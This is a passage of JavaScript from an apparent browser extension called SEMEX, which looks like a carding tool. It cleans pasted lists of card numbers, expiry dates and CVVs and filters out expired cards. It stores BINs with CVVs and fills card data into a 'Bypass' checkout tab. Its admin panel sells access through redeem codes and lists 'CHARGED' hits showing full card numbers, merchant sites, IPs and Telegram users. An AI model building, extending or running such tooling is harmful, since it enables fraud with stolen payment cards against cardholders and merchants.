      const maxLen = Math.min(19, digits.length);
      for (let len = maxLen; len >= 13; len--) {
        const candidate = digits.slice(0, len);
        if (!luhn(candidate)) continue;
        // How many chars of `raw` did those `len` digits consume?
        let consumed = 0, count = 0;
        for (let i = 0; i < raw.length && count < len; i++) {
          if (/\d/.test(raw[i])) count++;
          consumed = i + 1;
        }
        bestPan = candidate;
        bestConsumed = consumed;
        break; // largest valid — done
      }
      if (!bestPan) continue;

      // Everything AFTER the PAN inside `raw` is potentially expiry/CVV.
      const restInRaw = raw.slice(bestConsumed);
      const restInChunk = chunk.slice(m.index + m[0].length);
      const rest = restInRaw + restInChunk;

      const parsed = extractExpAndCvv(rest, bestPan);
      if (parsed) {
        const ey4 = parsed.yy.length === 4 ? parseInt(parsed.yy, 10) : (2000 + parseInt(parsed.yy, 10));
        const em = parseInt(parsed.mm, 10);
        if (ey4 < nowY || (ey4 === nowY && em < nowM)) continue;
        const yyShort = String(ey4 % 100).padStart(2, "0");
        results.push({ pan: bestPan, mm: parsed.mm.padStart(2, "0"), yy: yyShort, cvv: parsed.cvv });
      }
    }
    return results;
  }

  function extractExpAndCvv(rest, pan) {
    if (!rest) return null;
    // Try "MM[sep]YY(YY)" first (most common), then fall back to bare "MMYY".
    let em = rest.match(/(?:^|[^\d])(0?[1-9]|1[0-2])\s*[\/\-\|:\.\s]\s*(\d{2}|\d{4})(?!\d)/);
    let mm, yy, afterIdx;
    if (em) {
      mm = em[1]; yy = em[2];
      afterIdx = em.index + em[0].length;
    } else {
      // Bare MMYY / MMYYYY with no separator, but still preceded by non-digit.
      em = rest.match(/(?:^|[^\d])(0[1-9]|1[0-2])(\d{2}|\d{4})(?!\d)/);
      if (!em) return null;
      mm = em[1]; yy = em[2];
      afterIdx = em.index + em[0].length;
    }
    const afterExp = rest.slice(afterIdx);
    const isAmex = pan.startsWith("34") || pan.startsWith("37");
    const cvvLen = isAmex ? 4 : 3;
    const cvvRegex = new RegExp("(?:^|[^\\d])(\\d{" + cvvLen + "})(?!\\d)");
    const cm = afterExp.match(cvvRegex);
    if (!cm) return null;
    return { mm, yy, cvv: cm[1] };
  }

  window.semexSmartCardCleaner = smartCardCleaner;
  window.semexLuhn = luhn;

  // --- Wire it into the CC List textarea (replaces old parser) ---
  function installPasteHook() {
    const ta = document.getElementById("cc-list-input");
    if (!ta || ta.dataset.semexSmart === "1") return;
    ta.dataset.semexSmart = "1";
    ta.addEventListener("paste", (ev) => {
      // Let the default paste happen, then re-clean the whole textarea.
      setTimeout(() => {
        const before = ta.value || "";
        const cleaned = smartCardCleaner(before);
        if (cleaned && cleaned !== before) {
          ta.value = cleaned;
          try { ta.dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
          try { ta.dispatchEvent(new Event("change", { bubbles: true })); } catch (e) {}
          if (typeof showToast === "function") {
            const n = cleaned.split("\n").filter(Boolean).length;
            showToast("Cleaned " + n + " card" + (n === 1 ? "" : "s") + " ✨", "success");
          }
        }
      }, 20);
    });
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", installPasteHook);
  } else {
    installPasteHook();
  }

  // --- Live BIN brand-logo preview + metadata lookup ---
  function installBinBrandPreview() {
    const binIn = document.getElementById("bin-input");
    if (!binIn || binIn.dataset.semexBrand === "1") return;
    binIn.dataset.semexBrand = "1";
    // Create/find the brand badge element
    const wrap = binIn.closest(".bin-input-wrap") || binIn.parentElement;
    if (!wrap) return;
    let badge = wrap.querySelector(".bin-brand-badge");
    if (!badge) {
      badge = document.createElement("span");
      badge.className = "bin-brand-badge";
      badge.setAttribute("data-testid", "bin-brand-badge");
      wrap.insertBefore(badge, wrap.firstChild);
    }
    // Info card (bank / country / level / type) rendered UNDER the input row
    const binGroup = wrap.parentElement; // .bin-group
    let info = binGroup ? binGroup.querySelector(".bin-info-card") : null;
    if (!info && binGroup) {
      info = document.createElement("div");
      info.className = "bin-info-card hidden";
      info.setAttribute("data-testid", "bin-info-card");
      info.innerHTML = ''
        + '<div class="bin-info-row"><span class="bin-info-brand"></span><span class="bin-info-scheme"></span></div>'
        + '<div class="bin-info-meta">'
        +   '<span class="bin-info-chip bin-info-bank" hidden><span class="chip-label">Bank</span><span class="chip-val"></span></span>'
        +   '<span class="bin-info-chip bin-info-type" hidden><span class="chip-label">Type</span><span class="chip-val"></span></span>'
        +   '<span class="bin-info-chip bin-info-level" hidden><span class="chip-label">Level</span><span class="chip-val"></span></span>'
        +   '<span class="bin-info-chip bin-info-country" hidden><span class="chip-label">Country</span><span class="chip-val"></span></span>'
        + '</div>';
      binGroup.appendChild(info);
    }
    let _lookupToken = 0;
    let _lastKey = "";
    async function lookupMeta(bin6) {
      const myTok = ++_lookupToken;
      try {
        if (!window.serverClient || !window.serverClient.baseUrl) return null;
        // Public BIN lookup — no auth needed
        const r = await fetch(window.serverClient.baseUrl + "/api/bin/" + encodeURIComponent(bin6), { cache: "force-cache" });
        if (myTok !== _lookupToken) return null;   // stale
        if (!r.ok) return null;
        return await r.json();
      } catch (e) { return null; }
    }
    function setChip(sel, label, val) {
      if (!info) return;
      const chip = info.querySelector(sel);
      if (!chip) return;
      if (val && String(val).trim()) {
        chip.querySelector(".chip-val").textContent = String(val).trim();
        chip.hidden = false;
      } else {
        chip.hidden = true;
      }
    }
    async function render() {
      const s = String(binIn.value || "").replace(/\D/g, "").slice(0, 8);
      if (s.length < 2) {
        badge.innerHTML = ""; badge.style.opacity = "0";
        if (info) info.classList.add("hidden");
        _lastKey = "";
        return;
      }
      const brand = detectBrand(s);
      badge.innerHTML = BRAND_SVG[brand] || BRAND_SVG.unknown;
      badge.title = (BRAND_META[brand] || BRAND_META.unknown).name;
      badge.style.opacity = "1";
      // Show basic info card immediately with the detected brand
      if (info) {
        info.classList.remove("hidden");
        info.querySelector(".bin-info-brand").innerHTML = (BRAND_SVG[brand] || BRAND_SVG.unknown) + '<span>' + ((BRAND_META[brand] || BRAND_META.unknown).name) + '</span>';
        info.querySelector(".bin-info-scheme").textContent = s.padEnd(6, "•").slice(0, 6);
      }
      // Fetch full metadata once we have 6+ digits — cache by key
      if (s.length >= 6 && info) {
        const key = s.slice(0, 6);
        if (key === _lastKey) return;
        _lastKey = key;
        // Show a subtle loading state
        setChip(".bin-info-bank", "Bank", "…");
        setChip(".bin-info-type", "Type", "");
        setChip(".bin-info-level", "Level", "");
        setChip(".bin-info-country", "Country", "");
        const m = await lookupMeta(key);
        if (!m || _lastKey !== key) return;
        setChip(".bin-info-bank", "Bank", m.bank);
        setChip(".bin-info-type", "Type", m.cardType || m.type);
        setChip(".bin-info-level", "Level", m.level);
        const flag = m.flag ? (m.flag + " ") : "";
        setChip(".bin-info-country", "Country", (m.country || m.countryName) ? (flag + (m.country || m.countryName)) : "");
      } else if (info && s.length < 6) {
        info.querySelectorAll(".bin-info-chip").forEach(c => c.hidden = true);
        _lastKey = "";
      }
    }
    binIn.addEventListener("input", render);
    // Debounced re-render on paste
    binIn.addEventListener("paste", () => setTimeout(render, 30));
    render();
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", installBinBrandPreview);
  } else {
    installBinBrandPreview();
  }
})();

/* ==================== SEMEX SAVED BINs LIBRARY ==================== */
(function semexSavedBinsUI() {
  let _bins = [];

  async function _hdr() {
    const s = await chrome.storage.local.get(["accessToken"]);
    return { "Authorization": "Bearer " + (s.accessToken || ""), "Content-Type": "application/json", "X-Fingerprint": (window.serverClient && window.serverClient.fingerprint) || "" };
  }
  function _base() { return (window.serverClient && window.serverClient.baseUrl) || ""; }
  function _esc(s) { if (s == null) return ""; return String(s).replace(/[&<>"']/g, (c) => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])); }

  /* ---- form modal: collects all fields in one screen ---- */
  function _showBinForm(opts) {
    // opts: { bin?, label?, notes?, expiry?, cvv?, isNew }
    // resolves with { bin, label, notes, expiry, cvv } or null if cancelled
    return new Promise(function(resolve) {
      var overlay = document.createElement("div");
      overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:99999;display:flex;align-items:center;justify-content:center;";
      var box = document.createElement("div");
      box.style.cssText = "background:#12122a;border:1px solid #2d2d5e;border-radius:14px;padding:22px 20px 18px;width:310px;max-width:94vw;box-shadow:0 8px 40px rgba(0,0,0,0.7);";
      var binField = opts.isNew
        ? '<label style="display:block;margin-bottom:13px;font-size:0.78rem;color:#9898c8;">BIN / Card Number<br><input id="_bfBin" type="text" inputmode="numeric" placeholder="6-19 digits  e.g. 411111 or 4111111111111111" value="' + _esc(opts.bin || "") + '" autocomplete="off" style="display:block;width:100%;margin-top:5px;padding:8px 10px;background:#1a1a35;border:1px solid #2d2d5e;border-radius:7px;color:#d0d0ff;font-size:0.9rem;box-sizing:border-box;font-family:monospace;outline:none;"></label>'
        : '';
      box.innerHTML =
        '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">' +
          '<span style="font-size:0.97rem;font-weight:600;color:#c0c0ff;">' + (opts.isNew ? "💾 Save BIN" : "✏️ Edit BIN") + '</span>' +
          '<button id="_bfX" style="background:none;border:none;color:#666;font-size:1.1rem;cursor:pointer;line-height:1;">✕</button>' +
        '</div>' +
        binField +
        '<label style="display:block;margin-bottom:13px;font-size:0.78rem;color:#9898c8;">Name / Label<br><input id="_bfLabel" type="text" placeholder="e.g. Chase Sapphire Gold" value="' + _esc(opts.label || "") + '" autocomplete="off" style="display:block;width:100%;margin-top:5px;padding:8px 10px;background:#1a1a35;border:1px solid #2d2d5e;border-radius:7px;color:#d0d0ff;font-size:0.9rem;box-sizing:border-box;outline:none;"></label>' +
        '<div style="display:flex;gap:10px;margin-bottom:13px;">' +
          '<label style="flex:1;font-size:0.78rem;color:#9898c8;">Expiry (MM/YY)<br><input id="_bfExp" type="text" inputmode="numeric" placeholder="MM/YY" value="' + _esc(opts.expiry || "") + '" maxlength="5" autocomplete="off" style="display:block;width:100%;margin-top:5px;padding:8px 10px;background:#1a1a35;border:1px solid #2d2d5e;border-radius:7px;color:#d0d0ff;font-size:0.9rem;box-sizing:border-box;font-family:monospace;outline:none;"></label>' +
          '<label style="flex:1;font-size:0.78rem;color:#9898c8;">CVV<br><input id="_bfCvv" type="text" inputmode="numeric" placeholder="3–4 digits" value="' + _esc(opts.cvv || "") + '" maxlength="4" autocomplete="off" style="display:block;width:100%;margin-top:5px;padding:8px 10px;background:#1a1a35;border:1px solid #2d2d5e;border-radius:7px;color:#d0d0ff;font-size:0.9rem;box-sizing:border-box;font-family:monospace;outline:none;"></label>' +
        '</div>' +
        '<label style="display:block;margin-bottom:18px;font-size:0.78rem;color:#9898c8;">Notes (optional)<br><input id="_bfNotes" type="text" placeholder="Any notes…" value="' + _esc(opts.notes || "") + '" autocomplete="off" style="display:block;width:100%;margin-top:5px;padding:8px 10px;background:#1a1a35;border:1px solid #2d2d5e;border-radius:7px;color:#d0d0ff;font-size:0.9rem;box-sizing:border-box;outline:none;"></label>' +
        '<div style="display:flex;gap:8px;justify-content:flex-end;">' +
          '<button id="_bfCancel" style="padding:8px 18px;background:#1e1e3a;border:1px solid #2d2d5e;border-radius:7px;color:#aaa;cursor:pointer;font-size:0.85rem;">Cancel</button>' +
          '<button id="_bfSave" style="padding:8px 22px;background:#5b21b6;border:none;border-radius:7px;color:#fff;cursor:pointer;font-size:0.85rem;font-weight:600;">Save</button>' +
        '</div>';
      overlay.appendChild(box);
      document.body.appendChild(overlay);

      // Auto-format expiry MM/YY
      var expEl = box.querySelector("#_bfExp");
      if (expEl) {
        expEl.addEventListener("input", function() {
          var v = expEl.value.replace(/\D/g, "");
          if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2, 4);
          expEl.value = v;
        });
      }

      function _close() { try { document.body.removeChild(overlay); } catch (_) {} }

      function _submit() {
        var binRaw = opts.isNew ? ((box.querySelector("#_bfBin") || {}).value || "") : (opts.bin || "");
        var result = {
          bin: binRaw.replace(/\D/g, "").slice(0, 19),
          label: (box.querySelector("#_bfLabel").value || "").trim() || null,
          expiry: (box.querySelector("#_bfExp").value || "").trim() || null,
          cvv: ((box.querySelector("#_bfCvv").value || "").replace(/\D/g, "").slice(0, 4)) || null,
          notes: (box.querySelector("#_bfNotes").value || "").trim() || null,
        };
        _close(); resolve(result);
      }

      box.querySelector("#_bfX").onclick = function() { _close(); resolve(null); };
      box.querySelector("#_bfCancel").onclick = function() { _close(); resolve(null); };
      box.querySelector("#_bfSave").onclick = _submit;
      overlay.addEventListener("click", function(e) { if (e.target === overlay) { _close(); resolve(null); } });
      // Submit on Enter in any input
      box.querySelectorAll("input").forEach(function(el) {
        el.addEventListener("keydown", function(e) { if (e.key === "Enter") _submit(); if (e.key === "Escape") { _close(); resolve(null); } });
      });
      // Focus first relevant input
      setTimeout(function() { var el = box.querySelector(opts.isNew ? "#_bfBin" : "#_bfLabel"); if (el) el.focus(); }, 60);
    });
  }

  function _renderRow(b) {
    const brand = (b.brand || (window.semexDetectBrand && window.semexDetectBrand(b.bin)) || "unknown").toLowerCase();
    const svg = (window.semexBrandSVG && window.semexBrandSVG[brand]) || (window.semexBrandSVG && window.semexBrandSVG.unknown) || "";
    const tags = [];
    if (b.cardType) tags.push('<span class="saved-bin-tag tag-' + _esc(b.cardType) + '">' + _esc(b.cardType.toUpperCase()) + '</span>');
    if (b.level) tags.push('<span class="saved-bin-tag">' + _esc(b.level.toUpperCase()) + '</span>');
    if (b.countryCode) tags.push('<span class="saved-bin-tag">' + _esc(b.countryCode) + '</span>');
    if (b.bank) tags.push('<span class="saved-bin-tag">' + _esc(b.bank.slice(0, 22)) + (b.bank.length > 22 ? '…' : '') + '</span>');
    const notes = b.notes ? '<div class="saved-bin-notes" title="' + _esc(b.notes) + '">' + _esc(b.notes) + '</div>' : '';
    // v2.9.4: country flag from the ISO code (regional indicator letters).
    const flag = (b.countryCode && /^[A-Za-z]{2}$/.test(b.countryCode))
      ? String.fromCodePoint(...[...b.countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt(0))) + ' '
      : '';
    const nameHtml = b.label ? '<span class="saved-bin-name">' + flag + _esc(b.label) + '</span>' : '<span class="mono-dim" style="font-size:0.8rem;font-style:italic;">' + flag + 'Unnamed</span>';
    // Expiry + CVV chips (CVV masked, tap to toggle)
    var ecHtml = '';
    if (b.expiry || b.cvv) {
      ecHtml = '<div style="display:flex;gap:6px;margin-top:4px;flex-wrap:wrap;">';
      if (b.expiry) ecHtml += '<span style="font-size:0.72rem;font-family:monospace;background:#1a1a35;border:1px solid #2d2d5e;border-radius:4px;padding:1px 6px;color:#a0d0ff;" title="Expiry">📅 ' + _esc(b.expiry) + '</span>';
      if (b.cvv) ecHtml += '<span class="semex-cvv-chip" data-cvv="' + _esc(b.cvv) + '" style="font-size:0.72rem;font-family:monospace;background:#1a1a35;border:1px solid #2d2d5e;border-radius:4px;padding:1px 6px;color:#ffd080;cursor:pointer;user-select:none;" title="Tap to show/hide CVV">🔑 •••</span>';
      ecHtml += '</div>';
    }
    return (
      '<div class="saved-bin-row" data-id="' + _esc(b.id) + '">' +
        '<div class="saved-bin-badge">' + svg + '</div>' +
        '<div class="saved-bin-info">' +
          '<div class="saved-bin-title"><span class="saved-bin-code">' + _esc(b.bin) + '</span> ' + nameHtml + '</div>' +
          notes +
          ecHtml +
          '<div class="saved-bin-meta">' + tags.join('') + '</div>' +
        '</div>' +
        '<div class="saved-bin-actions">' +
          '<button class="saved-bin-btn" data-act="copy" title="Copy BIN + expiry + CVV">📋</button>' +
          '<button class="saved-bin-btn" data-act="use" data-testid="use-bin-' + _esc(b.bin) + '">Use</button>' +
          '<button class="saved-bin-btn" data-act="edit">Edit</button>' +
          '<button class="saved-bin-btn danger" data-act="delete">Delete</button>' +
        '</div>' +
      '</div>'
    );
  }

  function _render() {
    const list = document.getElementById("saved-bins-list");
    if (!list) return;
    const q = (document.getElementById("saved-bins-search") || {}).value || "";
    const qLower = q.toLowerCase().trim();
    let rows = _bins;
    if (qLower) {
      rows = rows.filter((b) => (
        (b.bin || "").includes(qLower) ||
        (b.label || "").toLowerCase().includes(qLower) ||
        (b.bank || "").toLowerCase().includes(qLower) ||
        (b.country || "").toLowerCase().includes(qLower) ||
        (b.notes || "").toLowerCase().includes(qLower)
      ));
    }
    if (!rows.length) {
      list.innerHTML = '<div class="saved-bins-empty">' + (qLower ? "No BINs match your search." : 'No saved BINs yet. Click <b>+ Add BIN</b> to save one.') + '</div>';
      return;
    }
    list.innerHTML = rows.map(_renderRow).join("");
  }

  async function _load() {
    const list = document.getElementById("saved-bins-list");
    if (list) list.innerHTML = '<div class="saved-bins-empty">Loading your saved BINs…</div>';
    try {
      const r = await window.serverClient.authedFetch("/api/user/bins");
      if (r.status === 401) throw new Error("Session expired — please log in again");
      if (!r.ok) throw new Error("HTTP " + r.status);
      const d = await r.json();
      _bins = d.bins || [];
      _render();
    } catch (e) {
      if (list) list.innerHTML = '<div class="saved-bins-empty" style="color:#ff8090;">Failed to load: ' + _esc(e.message || e) + '</div>';
    }
  }

  async function _delete(id) {
    const ok = await (typeof showConfirmModal === "function"
      ? showConfirmModal("Delete BIN", "Remove this saved BIN? This cannot be undone.", "Delete")
      : Promise.resolve(confirm("Delete this saved BIN?")));
    if (!ok) return;
    try {
      const r = await window.serverClient.authedFetch("/api/user/bins/" + id, { method: "DELETE" });
      if (r.status === 401) throw new Error("Session expired — please log in again");
      if (!r.ok) throw new Error("HTTP " + r.status);
      await _load();
    } catch (e) {
      if (typeof showToast === "function") showToast("Delete failed: " + (e.message || e), "error");
    }
  }

  async function _edit(id) {
    const b = _bins.find((x) => x.id === id);
    if (!b) return;
    const vals = await _showBinForm({ bin: b.bin, label: b.label, notes: b.notes, expiry: b.expiry, cvv: b.cvv, isNew: false });
    if (!vals) return;
    try {
      const r = await window.serverClient.authedFetch("/api/user/bins/" + id, {
        method: "PATCH",
        body: JSON.stringify({ label: vals.label, notes: vals.notes, expiry: vals.expiry, cvv: vals.cvv }),
      });
      if (r.status === 401) throw new Error("Session expired — please log in again");
      if (!r.ok) throw new Error("HTTP " + r.status);
      await _load();
      if (typeof showToast === "function") showToast("BIN updated ✨", "success");
    } catch (e) {
      if (typeof showToast === "function") showToast("Update failed: " + (e.message || e), "error");
    }
  }

  function _use(b) {
    // Fill BIN/card number
    const input = document.getElementById("bin-input");
    if (input) {
      input.value = b.bin;
      try { input.dispatchEvent(new Event("input", { bubbles: true })); } catch (e) {}
      try { input.dispatchEvent(new Event("change", { bubbles: true })); } catch (e) {}
    }
    // Fill expiry if field exists in the bypass/checkout tab
    if (b.expiry) {
      const expEl = document.getElementById("exp-input") || document.getElementById("expiry-input") || document.querySelector('input[data-field="expiry"]');
      if (expEl) { expEl.value = b.expiry; try { expEl.dispatchEvent(new Event("input", { bubbles: true })); } catch (_) {} }
    }
    // Fill CVV if field exists
    if (b.cvv) {
      const cvvEl = document.getElementById("cvv-input") || document.querySelector('input[data-field="cvv"]');
      if (cvvEl) { cvvEl.value = b.cvv; try { cvvEl.dispatchEvent(new Event("input", { bubbles: true })); } catch (_) {} }
    }
    // Switch to Bypass tab
    const bypassNav = document.querySelector('.tab[data-tab="bypass"]');
    if (bypassNav) bypassNav.click();
    if (typeof showToast === "function") showToast("BIN " + b.bin + " loaded", "success");
  }

  async function _addCurrentBin() {
    // Pre-fill BIN from the bypass tab input if one is already entered
    const input = document.getElementById("bin-input");
    const prefill = input ? String(input.value || "").replace(/\D/g, "").slice(0, 19) : "";
    const vals = await _showBinForm({ bin: prefill, isNew: true });
    if (!vals) return;
    if (!vals.bin || vals.bin.length < 6) {
      if (typeof showToast === "function") showToast("BIN must be at least 6 digits", "error");
      return;
    }
    try {
      const r = await window.serverClient.authedFetch("/api/user/bins", {
        method: "POST",
        body: JSON.stringify({ bin: vals.bin, label: vals.label, notes: vals.notes, expiry: vals.expiry, cvv: vals.cvv }),
      });
      if (r.status === 401) throw new Error("Session expired — please log in again");
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.detail || d.error || ("HTTP " + r.status));
      await _load();
      if (typeof showToast === "function") showToast("Saved " + vals.bin + " ✨", "success");
    } catch (e) {
      if (typeof showToast === "function") showToast("Save failed: " + (e.message || e), "error");
    }
  }

  window.loadSavedBinsPanel = _load;

  // Delegated handlers
  document.addEventListener("click", (ev) => {
    // CVV tap-to-reveal
    const cvvChip = ev.target && ev.target.closest && ev.target.closest(".semex-cvv-chip");
    if (cvvChip) {
      const shown = cvvChip.dataset.shown === "1";
      if (shown) { cvvChip.textContent = "🔑 •••"; cvvChip.dataset.shown = "0"; }
      else { cvvChip.textContent = "🔑 " + (cvvChip.dataset.cvv || ""); cvvChip.dataset.shown = "1"; }
      return;
    }
    const btn = ev.target && ev.target.closest && ev.target.closest(".saved-bin-btn[data-act]");
    if (btn) {
      const row = btn.closest(".saved-bin-row");
      const id = row && row.dataset.id;
      const act = btn.dataset.act;
      const b = _bins.find((x) => x.id === id);
      if (act === "delete") return _delete(id);
      if (act === "edit") return _edit(id);
      if (act === "use" && b) return _use(b);
      // v2.9.4: one-tap copy of the full card line (bin|expiry|cvv).
      if (act === "copy" && b) {
        const line = [b.bin, b.expiry || "", b.cvv || ""].join("|").replace(/\|+$/, "");
        const done = () => { if (typeof showToast === "function") showToast("Copied " + line, "success"); };
        try {
          if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(line).then(done, () => {});
          } else {
            const ta = document.createElement("textarea");
            ta.value = line; document.body.appendChild(ta); ta.select();
            try { document.execCommand("copy"); } catch (_) {}
            ta.remove(); done();
          }
        } catch (_) {}
        return;
      }
    }
    if (ev.target && ev.target.id === "saved-bins-refresh-btn") _load();
    if (ev.target && ev.target.id === "saved-bins-add-btn") _addCurrentBin();
  });
  document.addEventListener("input", (ev) => {
    if (ev.target && ev.target.id === "saved-bins-search") _render();
  });
})();

/* ==================== SEMEX ADMIN — Stats / Codes / Hits / News / Broadcast ==================== */
(function semexAdminExtras() {
  async function _hdr() {
    const s = await chrome.storage.local.get(["accessToken"]);
    return {
      "Authorization": "Bearer " + (s.accessToken || ""),
      "Content-Type": "application/json",
      "X-Fingerprint": (window.serverClient && window.serverClient.fingerprint) || "",
                "X-Extension-Version": (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.getManifest ? (chrome.runtime.getManifest().version || "") : ""),
    };
  }
  function _base() { return (window.serverClient && window.serverClient.baseUrl) || ""; }
  function _esc(s) { if (s == null) return ""; return String(s).replace(/[&<>"']/g, (c) => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c])); }
  function _toast(msg, level) { if (typeof showToast === "function") showToast(msg, level || "info"); }

  // -------- STATS --------
  async function loadStats() {
    const grid = document.getElementById("admin-stats-grid");
    if (!grid) return;
    try {
      const r = await fetch(_base() + "/api/admin/stats", { headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      // v2.9.5: the API returns NESTED keys (users.total / hits.charged / ...);
      // the old flat keys never existed, so every card rendered "—".
      const cards = [
        ["Users", d.users && d.users.total],
        ["Admins", d.users && d.users.admins],
        ["Banned", d.users && d.users.banned],
        ["Charged Hits", d.hits && d.hits.charged],
        ["All Hits", d.hits && d.hits.total],
        ["Unused Codes", d.codes && d.codes.unused],
        ["Used Codes", d.codes && d.codes.used],
      ];
      grid.innerHTML = cards.map(([label, val]) =>
        '<div class="admin-stat-card"><div class="admin-stat-value">' + _esc(val == null ? "—" : val) + '</div><div class="admin-stat-label">' + _esc(label) + '</div></div>'
      ).join("");
    } catch (e) {
      grid.innerHTML = '<div class="mono-dim" style="color:#ff8090;padding:8px;">Stats unavailable</div>';
    }
  }

  // -------- REDEEM CODES --------
  async function loadCodes() {
    const list = document.getElementById("codes-list");
    if (!list) return;
    try {
      const r = await fetch(_base() + "/api/admin/codes?limit=100", { headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      const codes = d.codes || [];
      if (!codes.length) { list.innerHTML = '<div class="mono-dim" style="padding:12px;">No codes yet. Generate some above.</div>'; return; }
      list.innerHTML = codes.map((c) => (
        '<div class="code-row ' + (c.used ? 'used' : '') + '">' +
          '<div>' +
            '<div class="code-preview">' + _esc(c.preview || "—") + '</div>' +
            '<div class="code-meta">' +
              '<span>' + _esc(c.planTag || "—") + '</span>' +
              '<span>' + (c.durationDays === -1 ? "Lifetime" : c.durationDays + "d") + '</span>' +
              (c.used ? '<span style="color:#ff8090;">USED · ' + _esc(String(c.usedBy||"")) + '</span>' : '<span style="color:#6bffb8;">UNUSED</span>') +
              (c.note ? '<span>· ' + _esc(c.note) + '</span>' : '') +
            '</div>' +
          '</div>' +
          '<div class="code-actions">' +
            (!c.used ? '<button data-code-del="' + _esc(c.id) + '" class="danger">Delete</button>' : '') +
          '</div>' +
        '</div>'
      )).join("");
    } catch (e) {
      list.innerHTML = '<div class="mono-dim" style="color:#ff8090;padding:12px;">Failed: ' + _esc(e.message||e) + '</div>';
    }
  }
  async function generateCode() {
    const days = parseInt(document.getElementById("codes-days").value, 10);
    const qty = parseInt(document.getElementById("codes-quantity").value, 10);
    const note = document.getElementById("codes-note").value.trim();
    if (isNaN(days) || isNaN(qty)) { _toast("Enter valid days + qty", "warning"); return; }
    try {
      const r = await fetch(_base() + "/api/admin/codes/generate", {
        method: "POST", headers: await _hdr(),
        body: JSON.stringify({ days, quantity: qty, note: note || null }),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      const codes = (d.codes || []).join("\n");
      try { await navigator.clipboard.writeText(codes); } catch (e) {}
      alert("✅ Generated " + d.count + " code(s) — " + d.planTag + "\n\n" + codes + "\n\n(Copied to clipboard.)");
      await loadCodes();
      await loadStats();
    } catch (e) {
      _toast("Generate failed: " + (e.message || e), "error");
    }
  }
  async function deleteCode(id) {
    if (!confirm("Delete this UNUSED code? This can't be undone.")) return;
    try {
      const r = await fetch(_base() + "/api/admin/codes/" + id, { method: "DELETE", headers: await _hdr() });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      await loadCodes();
    } catch (e) { _toast("Delete failed: " + (e.message || e), "error"); }
  }

  // -------- HITS FEED --------
  async function loadAllHits() {
    const list = document.getElementById("all-hits-list");
    if (!list) return;
    try {
      const r = await fetch(_base() + "/api/admin/hits?limit=50", { headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error(d.detail || "HTTP " + r.status);
      const hits = d.hits || [];
      if (!hits.length) { list.innerHTML = '<div class="mono-dim" style="padding:12px;">No hits yet.</div>'; return; }
      list.innerHTML = hits.map((h) => {
        const pan = String(h.card || h.card_number || "").split(/[|:\s]/)[0].replace(/\D/g, "");
        const brand = (window.semexDetectBrand && pan) ? window.semexDetectBrand(pan) : "unknown";
        const svg = (window.semexBrandSVG && window.semexBrandSVG[brand]) || "";
        const time = h.created_at ? new Date(h.created_at).toLocaleString() : "";
        const uname = h.username ? "@" + String(h.username) : (h.first_name ? String(h.first_name) : "tg:" + String(h.telegram_id||""));
        const amt = (h.amount !== null && h.amount !== undefined && h.amount !== "")
          ? (String(h.currency || "USD").toUpperCase() + " " + String(h.amount))
          : "";
        const site = h.site || h.hostname || h.url || h.merchant || "—";
        const card = h.card || h.card_number || "—";
        const bin = String(pan).slice(0, 6);
        const ipTxt = h.ip || "";
        const ipCountry = h.ip_country || "";
        return '<div class="hit-row hit-charged" data-testid="admin-hit-row">' +
          '<div class="hit-row-top">' +
            '<span class="hit-brand">' + svg + '</span>' +
            '<span class="hit-badge hit-badge-charged">' + _esc(h.status || "CHARGED") + '</span>' +
            (bin ? '<span class="hit-bin">' + _esc(bin) + '</span>' : '') +
            (amt ? '<span class="hit-amount">' + _esc(amt) + '</span>' : '') +
            '<span class="hit-user-chip">' + _esc(uname) + '</span>' +
            '<span class="hit-time">' + _esc(time) + '</span>' +
            '<button class="hit-copy-btn" data-copy="' + _esc(card) + '" title="Copy full card">⧉</button>' +
          '</div>' +
          '<div class="hit-row-card">' +
            '<span class="hit-tag">CARD</span>' +
            '<span class="hit-pan">' + _esc(card) + '</span>' +
          '</div>' +
          '<div class="hit-details-grid">' +
            '<div class="hit-detail"><span class="hit-tag">SITE</span><span class="hit-val hit-mono">' + _esc(site) + '</span></div>' +
            (ipTxt ? '<div class="hit-detail"><span class="hit-tag">IP</span><span class="hit-val hit-mono">' + _esc(ipTxt) + (ipCountry ? ' <span class="hit-ip-country">' + _esc(ipCountry) + '</span>' : '') + '</span></div>' : '') +
          '</div>' +
        '</div>';
      }).join("");
    } catch (e) {
      list.innerHTML = '<div class="mono-dim" style="color:#ff8090;padding:12px;">Failed: ' + _esc(e.message||e) + '</div>';
    }
  }

  // -------- NEWS --------
  async function loadNewsAdmin() {
    const list = document.getElementById("news-list-admin");
    if (!list) return;
    try {
      const r = await fetch(_base() + "/api/news", { headers: await _hdr() });
      const d = await r.json();
      if (!r.ok) throw new Error("HTTP " + r.status);
      const posts = d.items || d.posts || d.news || [];
      if (!posts.length) { list.innerHTML = '<div class="mono-dim" style="padding:12px;">No news posts yet.</div>'; return; }
      list.innerHTML = posts.map((p) => (
        '<div class="code-row">' +
          '<div>' +
            '<div class="code-preview" style="color:var(--text-primary);">' + (p.important ? "⚡ " : "") + _esc(p.title || "") + '</div>' +
            '<div class="code-meta"><span>' + _esc(p.body ? String(p.body).slice(0,80) : "") + '</span></div>' +
          '</div>' +
          '<div class="code-actions"><button data-news-del="' + _esc(p.id || p._id || "") + '" class="danger">Delete</button></div>' +
        '</div>'
      )).join("");
